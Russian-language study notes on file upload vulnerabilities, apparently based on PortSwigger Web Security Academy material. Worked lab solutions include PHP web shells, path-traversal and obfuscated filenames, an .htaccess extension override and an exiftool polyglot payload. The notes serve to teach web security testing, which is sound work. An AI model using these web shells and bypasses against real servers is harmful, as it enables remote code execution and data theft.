
---

# Теория

![[Pasted image 20240624020213.png]]

---

### Что такое уязвимости загрузки файлов?  

**Уязвимости загрузки файлов** - это когда веб-сервер позволяет пользователям загружать файлы в свою файловую систему без достаточной проверки таких параметров, как их имя, тип, содержимое или размер. Невозможность должным образом обеспечить соблюдение этих ограничений может привести к тому, что даже базовая функция загрузки изображений может быть использована для загрузки произвольных и потенциально опасных файлов. Это могут быть даже файлы сценариев на стороне сервера, которые позволяют удаленно выполнять код.  
  
В некоторых случаях для нанесения ущерба достаточно самого факта загрузки файла. Другие атаки могут включать последующий HTTP-запрос файла, обычно для того, чтобы инициировать его выполнение на сервере.

---

### Каково влияние уязвимостей загрузки файлов?  

Влияние уязвимостей загрузки файлов обычно зависит от двух ключевых факторов:  
* Какой аспект файла веб-сайт не смог правильно проверить, будь то его размер, тип, содержимое и так далее.  
* Какие ограничения накладываются на файл после его успешной загрузки.  

В худшем случае тип файла не проверяется должным образом, и конфигурация сервера позволяет выполнять определенные типы файлов (например, .php и .jsp) в качестве кода. В этом случае злоумышленник может загрузить файл с кодом на стороне сервера, который функционирует как веб-оболочка, предоставляя полный контроль над сервером.  
  
Если имя файла не проверяется должным образом, это может позволить злоумышленнику перезаписать важные файлы, просто загрузив файл с таким же именем. Если сервер также уязвим для обхода каталогов, это может означать, что злоумышленники могут даже загружать файлы в непредусмотренные места.  
  
Если не убедиться в том, что размер файла не превышает ожидаемого порога, это может привести к атаке типа "отказ в обслуживании" (DoS), в результате которой злоумышленник заполняет все доступное дисковое пространство.

---

### Как возникают уязвимости при загрузке файлов?  
Учитывая довольно очевидную опасность, редко когда на веб-сайтах нет никаких ограничений на то, какие файлы разрешено загружать пользователям. Чаще всего разработчики внедряют надежную, по их мнению, проверку, которая либо изначально несовершенна, либо легко обходится.  
  
Например, они могут попытаться внести опасные типы файлов в черный список, но не учесть расхождения в парсинге при проверке расширений файлов. Как и в случае с любым другим черным списком, легко случайно пропустить более малоизвестные типы файлов, которые все равно могут быть опасными.  
  
В других случаях веб-сайт может пытаться проверить тип файла, проверяя свойства, которыми злоумышленник может легко манипулировать с помощью таких инструментов, как Burp Proxy или Repeater.  
  
В конечном итоге даже надежные меры проверки могут применяться непоследовательно в сети хостов и каталогов, образующих веб-сайт, что приведет к расхождениям, которые можно использовать в своих целях.

---

### Как веб-серверы обрабатывают запросы на статические файлы?  

Прежде чем мы рассмотрим, как использовать уязвимости загрузки файлов, важно иметь базовое представление о том, как серверы обрабатывают запросы на статические файлы.  
  
Исторически сложилось так, что веб-сайты почти полностью состояли из статических файлов, которые предоставлялись пользователям по запросу. В результате путь каждого запроса можно было сопоставить 1:1 с иерархией каталогов и файлов в файловой системе сервера. В настоящее время веб-сайты становятся все более динамичными, и путь запроса часто вообще не имеет прямого отношения к файловой системе. Тем не менее, веб-серверы все еще имеют дело с запросами на некоторые статические файлы, включая таблицы стилей, изображения и так далее.  
  
Процесс работы с этими статическими файлами во многом одинаков. В определенный момент сервер анализирует путь в запросе, чтобы определить расширение файла. Затем он использует его для определения типа запрашиваемого файла, обычно сравнивая его со списком предварительно настроенных соответствий между расширениями и типами MIME. Дальнейшие действия зависят от типа файла и конфигурации сервера.

- Если этот тип файла неисполняемый, например изображение или статическая HTML-страница, сервер может просто отправить содержимое файла клиенту в HTTP-ответе.
- Если тип файла исполняемый, например PHP-файл, **и** сервер настроен на выполнение файлов этого типа, он назначит переменные на основе заголовков и параметров в HTTP-запросе перед выполнением скрипта. Полученный результат может быть отправлен клиенту в HTTP-ответе.
- Если тип файла является исполняемым, но сервер не настроен на выполнение файлов такого типа, он обычно отвечает ошибкой. Однако в некоторых случаях содержимое файла может быть передано клиенту в виде обычного текста. Такие ошибки в конфигурации иногда могут использоваться для утечки исходного кода и другой конфиденциальной информации. [Пример](https://portswigger.net/web-security/information-disclosure/exploiting#source-code-disclosure-via-backup-files) этого вы можете увидеть в [учебных материалах](https://portswigger.net/web-security/information-disclosure) по раскрытию информации.

<details>
    <summary style="cursor: pointer"><b>Tip</b></summary>
        Заголовок ответа <code>Content-Type</code> может дать подсказку о том, какой файл, по мнению сервера, он обслужил. Если этот заголовок не был явно установлен кодом приложения, он обычно содержит результат сопоставления расширения файла с типом MIME.
</details>

---

#  Неограниченная загрузка файлов для развертывания Web shell-а

С точки зрения безопасности наихудший сценарий - это когда веб-сайт позволяет загружать серверные сценарии, такие как файлы PHP, Java или Python, а также настроен на их выполнение в виде кода. Это позволяет легко создать на сервере собственную веб-оболочку.

### Web shell

**Веб-оболочка** - это вредоносный скрипт, который позволяет злоумышленнику выполнять произвольные команды на удаленном веб-сервере, просто отправляя HTTP-запросы на нужную конечную точку.

Если вам удастся успешно загрузить веб-оболочку, вы фактически получите полный контроль над сервером. Это означает, что вы можете читать и записывать произвольные файлы, передавать конфиденциальные данные и даже использовать сервер для атак как на внутреннюю инфраструктуру, так и на другие серверы вне сети. Например, следующая однострочная команда PHP может быть использована для чтения произвольных файлов из файловой системы сервера:

```
<?php echo file_get_contents('/path/to/target/file'); ?>
```

После загрузки запрос на этот вредоносный файл вернет в ответ содержимое целевого файла.

Более универсальная веб-оболочка может выглядеть примерно так:
```
<?php echo system($_GET['command']); ?>
```
Этот сценарий позволяет передать произвольную системную команду через параметр запроса следующим образом:
```
GET /example/exploit.php?command=id HTTP/1.1
```

### Удаленное выполнение кода через Web shell upload

https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload

Эта лабораторная содержит уязвимую функцию загрузки изображений. Она не выполняет никакой проверки файлов, загружаемых пользователями, перед тем как сохранить их в файловой системе сервера.  
  
Чтобы решить эту задачу, загрузите базовую веб-оболочку PHP и используйте ее для получения содержимого файла `/home/carlos/secret`. Отправьте этот секрет с помощью кнопки, расположенной на баннере лаборатории.  
  
Вы можете войти в свою учетную запись, используя следующие учетные данные: `wiener:peter`

#### Решение

файл: `exploit.php`
```
<?php echo file_get_contents('/home/carlos/secret'); ?>
```
Далее нужно лишь обратиться к файлу:
```
GET /files/avatars/exploit.php HTTP/1.1
```

# Недостатки проверки загружаемых файлов  

Вряд ли вы найдете сайт, на котором нет защиты от атак на загрузку файлов, как мы видели в предыдущем примере. Но если защита существует, это еще не значит, что она надежна. Иногда все еще можно использовать недостатки в этих механизмах, чтобы получить веб-оболочку для удаленного выполнения кода.

## Неправильная проверка **Content-Type**

При отправке HTML-форм браузер обычно отправляет данные в `POST`-запросе с типом содержимого `application/x-www-form-url-encoded`. Это хорошо подходит для отправки простого текста, например вашего имени или адреса. Однако он не подходит для отправки больших объемов двоичных данных, например целого файла изображения или PDF-документа. В этом случае предпочтительнее использовать тип содержимого `multipart/form-data`.  
  
Рассмотрим форму, содержащую поля для загрузки изображения, его описания и ввода имени пользователя. При отправке такой формы может возникнуть запрос, который выглядит примерно так:
```
POST /images HTTP/1.1
Host: normal-website.com
Content-Length: 12345
Content-Type: multipart/form-data; boundary=---------------------------012345678901234567890123456 

---------------------------012345678901234567890123456
Content-Disposition: form-data; name="image"; filename="example.jpg"
Content-Type: image/jpeg

[...binary content of example.jpg...]

---------------------------012345678901234567890123456
Content-Disposition: form-data; name="description"

This is an interesting description of my image.

---------------------------012345678901234567890123456
Content-Disposition: form-data; name="username"

wiener
---------------------------012345678901234567890123456--
```

Как видите, тело сообщения разделено на отдельные части для каждого из вводимых данных формы. Каждая часть содержит заголовок `Content-Disposition`, в котором содержится основная информация о поле ввода, к которому она относится. Эти отдельные части также могут содержать свой заголовок `Content-Type`, который сообщает серверу MIME-тип данных, отправленных с помощью этого ввода.  
  
Один из способов, с помощью которого веб-сайты могут пытаться проверить правильность загрузки файлов, - это проверка соответствия заголовка `Content-Type`, специфичного для поля ввода, ожидаемому типу MIME. Например, если сервер ожидает только файлы изображений, он может разрешить только такие типы, как `image/jpeg` и` image/png`. Проблемы могут возникнуть, если сервер неявно доверяет значению этого заголовка. Если не проводится дальнейшая проверка соответствия содержимого файла предполагаемому MIME-типу, эту защиту можно легко обойти с помощью таких инструментов, как Burp Repeater.

### Web shell upload через обход ограничений Content-Type
https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-content-type-restriction-bypass
Эта лабораторная содержит уязвимую функцию загрузки изображений. Она пытается предотвратить загрузку пользователями файлов неожиданных типов, но для проверки этого полагается на проверку контролируемого пользователем ввода.  
  
Чтобы решить эту задачу, загрузите базовую веб-оболочку PHP и используйте ее для получения содержимого файла `/home/carlos/secret`. Отправьте этот секрет с помощью кнопки, указанной на баннере лаборатории.  
  
Вы можете войти в свой собственный аккаунт, используя следующие учетные данные: `wiener:peter`

#### Решение

файл: `exploit.php`
```
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

с помощью Reapeter нужно изменить заголовок файла `Content-Type` для файла на тот, который поддерживает сервис. Например: `Content-Type: image/jpeg`.

Далее нужно лишь обратиться к файлу:
```
GET /files/avatars/exploit.php HTTP/1.1
```

## Предотвращение выполнения файлов в каталогах, доступных пользователю

Хотя, конечно, лучше вообще не допускать загрузки файлов опасных типов, вторая линия защиты - не дать серверу выполнить скрипты, которые все же проскочили в сеть.  
  
В качестве меры предосторожности серверы обычно запускают только те скрипты, MIME-тип которых явно настроен на выполнение. В противном случае они могут просто вернуть какое-нибудь сообщение об ошибке или, в некоторых случаях, выдать содержимое файла в виде обычного текста:
```
GET /static/exploit.php?command=id HTTP/1.1
	Host: normal-website.com

	HTTP/1.1 200 OK
	Content-Type: text/plain
	Content-Length: 39

	<?php echo system($_GET['command']); ?>
```

Такое поведение потенциально интересно само по себе, так как может дать возможность утечки исходного кода, но оно сводит на нет все попытки создать веб-оболочку.  
  
Конфигурация такого рода часто различается между каталогами. Каталог, в который загружаются пользовательские файлы, скорее всего, будет иметь гораздо более строгий контроль, чем другие места в файловой системе, которые, как предполагается, недоступны для конечных пользователей. Если вы найдете способ загрузить сценарий в другой каталог, который не должен содержать пользовательские файлы, сервер, возможно, все-таки выполнит ваш сценарий.

<details>
    <summary style="cursor: pointer"><b>Tip</b></summary>
    Веб-серверы часто используют поле <code>filename</code> в запросах <code>multipart/form-data</code> для определения имени и места сохранения файла.
</details>

Обратите внимание, что даже если вы отправляете все запросы на одно и то же доменное имя, оно часто указывает на какой-либо обратный прокси-сервер, например, балансировщик нагрузки. Часто ваши запросы будут обрабатываться дополнительными серверами, которые могут быть настроены по-разному.

### Web shell upload через [path traversal](https://portswigger.net/web-security/file-path-traversal)

https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-path-traversal

Эта лабораторная содержит уязвимую функцию загрузки изображений. Сервер настроен на предотвращение выполнения файлов, предоставленных пользователем, но это ограничение можно обойти, используя вторичную уязвимость.  
  
Чтобы решить эту задачу, загрузите базовый `web-shell PHP` и используйте его для получения содержимого файла `/home/carlos/secret`. Отправьте этот секрет с помощью кнопки, указанной в баннере лаборатории.  
  
Вы можете войти в свою учетную запись, используя следующие учетные данные: `wiener:peter`

#### Решение

загружаем `exploit.php`:
```
<?php echo file_get_contents('/home/carlos/secret');
```
в запросе меняем имя файла, а после кодируем `/` в URL:
```
Content-Disposition: form-data; name="avatar"; filename="../exploit.php"

filename="..%2fexploit.php"
```
далее через поле поиска в браузере обращаемся к своему файлу:
```
.../files/avatars/../exploit.php
```

## Недостаточный черный список опасных типов файлов

Одним из наиболее очевидных способов предотвращения загрузки пользователями вредоносных скриптов является внесение в черный список потенциально опасных расширений файлов, таких как `.php`. Практика составления черных списков по своей сути несовершенна, поскольку сложно явно заблокировать все возможные расширения файлов, которые могут быть использованы для выполнения кода. Иногда такие черные списки можно обойти, используя менее известные, альтернативные расширения файлов, которые все равно могут быть исполняемыми, например `.php5`, `.shtml` и т. д.

### Переопределение конфигурации сервера

Как мы уже говорили в предыдущем разделе, серверы обычно не выполняют файлы, если они не настроены на это. Например, прежде чем сервер Apache будет выполнять PHP-файлы, запрошенные клиентом, разработчикам придется добавить следующие директивы в файл `/etc/apache2/apache2.conf`:
```
LoadModule php_module /usr/lib/apache2/modules/libphp.so
	AddType application/x-httpd-php .php
```

Многие серверы также позволяют разработчикам создавать специальные конфигурационные файлы в отдельных каталогах, чтобы отменить или дополнить одну или несколько глобальных настроек. Серверы `Apache`, например, загружают конфигурацию конкретной директории из файла `.htaccess`, если таковой имеется.

Аналогичным образом разработчики могут настраивать конкретные директории на серверах `IIS` с помощью файла `web.config`. Он может включать такие директивы, как следующая, которая в данном случае позволяет обслуживать JSON-файлы для пользователей:
```
<staticContent>
	<mimeMap fileExtension=".json" mimeType="application/json" /> </staticContent>
```

Веб-серверы используют такие конфигурационные файлы при наличии, но обычно вам не разрешается обращаться к ним с помощью HTTP-запросов. Однако иногда встречаются серверы, которые не могут помешать вам загрузить свой собственный вредоносный файл конфигурации. В этом случае, даже если нужное вам расширение файла занесено в черный список, вы сможете обмануть сервер, сопоставив произвольное пользовательское расширение файла с исполняемым MIME-типом.

#### Web shell upload через обход черного списка расширений

https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-extension-blacklist-bypass

Эта лабораторная содержит уязвимую функцию загрузки изображений. Определенные расширения файлов занесены в черный список, но эта защита может быть обойдена из-за фундаментального недостатка в конфигурации этого черного списка.  
  
Чтобы решить эту задачу, загрузите базовую веб-оболочку PHP, а затем используйте ее для получения содержимого файла `/home/carlos/secret`. Отправьте этот секрет с помощью кнопки, указанной в баннере лаборатории.  
  
Вы можете войти в свой собственный аккаунт, используя следующие учетные данные: `wiener:peter`

##### Решение

загружаем `exploit.php`:
```
<?php echo file_get_contents('/home/carlos/secret');
```
Т.к. на веб-сервере используется Apache в запросе меняем `filename` и `Content-Type`:
```
Content-Disposition: form-data; name="avatar"; filename=".htaccess"
Content-Type: text/plain
```
Также необходимо заменить содержимое файла (полезную нагрузку) следующей директивой:
``` 
AddType application/x-httpd-php .l33t
```
Это сопоставляет произвольное расширение (`.l33t`) с исполняемым MIME-типом `application/x-httpd-php`. Поскольку сервер использует модуль `mod_php`, он уже знает, как с этим справиться.

Отправляем файл и убеждаемся, что он доставлен.

Далее отправляем снова исходный файл, но с изменённым расширением.
``` 
filename="exploit.l33t"
```

Наконец через поле поиска в браузере обращаемся к своему файлу:
```
.../files/avatars/exploit.l33t
```

### Обфускация расширений файлов

Даже самые исчерпывающие черные списки можно обойти с помощью классических методов обфускации. Допустим, код проверки чувствителен к регистру и не распознает, что `exploit.pHp` на самом деле является файлом `.php`. Если код, который впоследствии сопоставляет расширение файла с MIME-типом, не чувствителен к регистру, это несоответствие позволяет пронести мимо проверки вредоносные PHP-файлы, которые в итоге могут быть выполнены сервером.

Подобных результатов можно добиться и с помощью следующих приемов:
- Предоставьте несколько расширений. В зависимости от алгоритма, используемого для разбора имени файла, следующий файл может быть интерпретирован как PHP-файл или JPG-изображение: `exploit.php.jpg`
- Добавьте символы в конце строки. Некоторые компоненты удаляют или игнорируют пробелы, точки и тому подобное: `exploit.php.`
- Попробуйте использовать кодировку URL (или двойную кодировку URL) для точек, прямых и обратных косых черт. Если значение не декодируется при проверке расширения файла, но позже декодируется на стороне сервера, это также может позволить вам загружать вредоносные файлы, которые в противном случае были бы заблокированы: `exploit%2Ephp`
- Добавьте точку с запятой или символы нулевого байта, закодированные в URL, перед расширением файла. Если проверка написана на языке высокого уровня, например PHP или Java, но сервер обрабатывает файл с помощью функций более низкого уровня, например C/C++, это может привести к расхождениям в том, что будет считаться концом имени файла: `exploit.asp;.jpg` или `exploit.asp%00.jpg`
- Попробуйте использовать многобайтовые символы юникода, которые могут быть преобразованы в нулевые байты и точки после преобразования или нормализации юникода. Последовательности типа `xC0 x2E`, `xC4 xAE` или` xC0 xAE` могут быть преобразованы в `x2E`, если имя файла анализируется как строка UTF-8, но затем преобразуются в символы ASCII перед использованием в пути.

Другие способы защиты включают удаление или замену опасных расширений, чтобы предотвратить выполнение файла. Если это преобразование не применяется рекурсивно, вы можете расположить запрещенную строку таким образом, что ее удаление все равно оставит допустимое расширение файла. Например, посмотрите, что произойдет, если вы удалите `.php` из следующего имени файла: `exploit.p.phphp`

Это лишь небольшая часть из множества способов завуалировать расширения файлов.

#### Web shell upload через обфусцированное расширение файла

https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-obfuscated-file-extension

Эта лабораторная содержит уязвимую функцию загрузки изображений. Определенные расширения файлов занесены в черный список, но эту защиту можно обойти, используя классическую технику обфускации.  
  
Чтобы решить эту задачу, загрузите базовую веб-оболочку PHP, а затем используйте ее для получения содержимого файла `/home/carlos/secret`. Отправьте этот секрет с помощью кнопки, расположенной на баннере лаборатории.  
  
Вы можете войти в свой собственный аккаунт, используя следующие учетные данные: `wiener:peter`

##### Решение

В данной лабораторной достаточно изменить название файла:

``` 
filename="web-shell.phpxC0 x2E.jpg"
```

### Неправильная проверка содержимого файла

Вместо того чтобы неявно доверять` Content-Type`, указанному в запросе, более безопасные серверы пытаются проверить, соответствует ли содержимое файла ожидаемому.  
  
В случае с функцией загрузки изображений сервер может попытаться проверить определенные внутренние свойства изображения, например его размеры. Если вы попробуете загрузить, например, PHP-скрипт, у него вообще не будет никаких размеров. Поэтому сервер может сделать вывод, что это не может быть изображением, и отклонить загрузку.  
  
Аналогично, некоторые типы файлов могут всегда содержать определенную последовательность байтов в заголовке или нижнем колонтитуле. Их можно использовать как отпечаток пальца или подпись, чтобы определить, соответствует ли содержимое ожидаемому типу. Например, файлы JPEG всегда начинаются с байтов `FF D8 FF`.  
  
Это гораздо более надежный способ проверки типа файла, но даже он не является надежным. С помощью специальных инструментов, таких как `ExifTool`, можно легко создать полиглотный JPEG-файл, содержащий вредоносный код в своих метаданных.

#### Remote code execution через **polyglot** web shell upload

https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-polyglot-web-shell-upload

Эта лабораторная содержит уязвимую функцию загрузки изображений. Хотя она проверяет содержимое файла, чтобы убедиться, что это подлинное изображение, все равно можно загрузить и выполнить код на стороне сервера.  
  
Чтобы решить эту задачу, загрузите базовую веб-оболочку PHP, а затем используйте ее для получения содержимого файла `/home/carlos/secret`. Отправьте этот секрет с помощью кнопки, расположенной на баннере лабораторной работы.  
  
Вы можете войти в свой собственный аккаунт, используя следующие учетные данные: `wiener:peter`

##### Решение

Создайте **polyglot** PHP/JPG-файл, который по своей сути является обычным изображением, но содержит в своих метаданных полезную нагрузку PHP. Простой способ сделать это - загрузить и запустить` ExifTool` из командной строки следующим образом:
```
exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php
```